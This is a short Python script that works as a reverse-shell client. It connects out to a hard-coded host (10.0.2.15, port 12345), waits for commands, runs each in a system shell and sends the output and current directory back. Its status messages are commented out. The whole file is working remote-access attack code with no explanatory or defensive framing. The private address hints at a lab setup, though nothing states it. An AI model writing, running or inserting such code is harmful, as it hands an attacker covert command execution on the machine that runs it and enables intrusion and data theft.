import socket, sys
import os
import subprocess


# Create socket
def create_socket():

    try: 
        global host
        global port
        global s
        host = '10.0.2.15'
        port = 12345
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#        print("Socket created")

    except:
        print("Couldn't create socket. Socket error!")


# Bind socket
def bind_socket():
    try:
        global host, port, s 
        s.connect((host, port))

#        print("Connected to host:{} on port: {}".format(host, port))
    except:
        print("Couldn't bind!!!")


# Receive commands
def commands():
    global s

    while True:
        data = s.recv(2048)
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out = cmd.stdout.read() + cmd.stderr.read()
            # Decode the collected output
            out = str(out, 'utf-8')
            s.send(str.encode(out + str(os.getcwd()) + '> '))
#            print(out)
    s.close()

def Main():
    create_socket()
    bind_socket()
    commands()


if __name__ == '__main__':
    Main()

            


